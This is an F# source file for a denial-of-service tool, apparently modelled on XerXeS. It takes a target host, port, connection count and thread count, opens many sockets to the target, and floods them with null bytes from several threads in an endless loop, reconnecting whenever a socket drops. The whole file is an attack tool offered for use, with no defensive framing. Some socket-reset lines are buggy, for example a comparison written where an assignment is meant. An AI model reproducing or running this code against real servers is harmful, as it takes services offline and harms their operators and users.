#nowarn "20"

namespace sultan

open sultan
open sultan.printxlib

open socklib

open System
open System.IO
open System.Text
open System.Numerics
open System.Threading
open System.Net.Sockets
open System.Collections.Generic

open CommandLine
open CommandLine.Text

module xerxeslib =
    let nil : string = string (char 0x00)

    type options = {
        [<Option('d', "host", Required = true, HelpText = "The host to perform the attack on.")>] host : string;
        [<Option('p', "port", Required = false, Default = "80", HelpText = "The host's port to which Sultan should connect.")>] port : string;
        [<Option('c', "connections", Required = false, Default = "30", HelpText = "The number of connections to make to the target server.")>] connections : string;
        [<Option('t', "threads", Required = false, Default = "3", HelpText = "The number of threads to use in the attack.")>] threads : string;
    }

    let rec sendnul (host : string) (port : int) (sockets : List<Socket>) (index : int) (number : bigint) =
        let request : byte array = Encoding.ASCII.GetBytes (nil)
        let socket = sockets.[index]
        let mutable newIndex = 0
        let mutable r = 0

        // The party starts right here
        try
            r <- socket.Send(request)
            ()
        with
            | :? System.Net.Sockets.SocketException as err ->
                 errorfn ("The established socket [" + index.ToString() + "] was aborted by the host machine's software.")
                 socket.Close
                 socket = socketutil.connect(host, port)
                 ()
            | :? System.ObjectDisposedException as err1 ->
                 warn (String.Format("0x{0:X8} socket is disposed, creating new socket.", err1.HResult))
                 socket.Close
                 socket = socketutil.connect(host, port)
                 ()
            | :? System.Exception as err2 ->
                 errorfn (String.Format("0x{0:X8} EXCEPTION! -> {1}", err2.HResult, err2.Message))
                 ()

        if r = -1 then
            socket.Close()
            socket = socketutil.connect(host, port)
            else false
        verbose ("volley [" + (Thread.CurrentThread.ManagedThreadId).ToString() + ">" + (number.ToString()) + "] sent")
        if (index + 1) >= sockets.Count then
            newIndex <- 0
            else newIndex <- (index + 1)

        let newno : bigint = BigInteger.Add(number, (bigint 1))

        sendnul host port sockets newIndex newno

    let startattackthreads (host : string) (port : int) (connections : int) (threadno : int) =
        let sockets : List<Socket> = new List<Socket>()
        for i = 0 to connections do
            sockets.Add(socketutil.connect(host, port))
        let param = struct(host, port, sockets, 0, 1)
        let cts = new ThreadStart((fun () -> sendnul host port sockets 0 (System.Numerics.BigInteger.Parse("1"))))
        let childthread : Thread = new Thread(cts)
        childthread.Start()
        success ("initialized thread " + threadno.ToString() + " -> " + (Thread.CurrentThread.ManagedThreadId).ToString())

    let start (host : string) (port : int) (connections : int) (threads : int) =
        let g : int = 1
        let r : int = 0
        for x = 0 to threads do
            startattackthreads host port connections x
            Thread.Sleep(15000)

    let attackx (args : string[]) : int =
        let mutable param = Parser.Default.ParseArguments<options>(args)
        let mutable opt : options = Unchecked.defaultof<options>

        match param with
            | :? Parsed<options> as parsed ->
                opt <- parsed.Value
            | :? NotParsed<options> as notParsed ->
                errorfn ("200 invalid options. " + (**notParsed.Errors.[0] +**) "fatal.")
                exit 1

        let host = opt.host

        let port = opt.port
        let connections = opt.connections
        let threads = opt.threads

        let mutable nport : int = 0
        let mutable nconn : int = 0
        let mutable thrds : int = 0

        try
            nport <- Int32.Parse(port)
            ()
        with
            | :? FormatException as err ->
                errorfn "201 the parameter `port` is not in the correct format. fatal."
                exit 1
                ()
        try
            thrds <- Int32.Parse(threads)
            ()
        with
            | :? FormatException as err ->
                errorfn "202 the parameter `threads` is not in the correct format. fatal."
                exit 1
                ()
        try
            nconn <- Int32.Parse(connections)
            ()
        with
            | :? FormatException as err ->
                errorfn "203 the paramete `connections` is not in the correct format. fatal."
                ()
        start host nport nconn thrds
        0
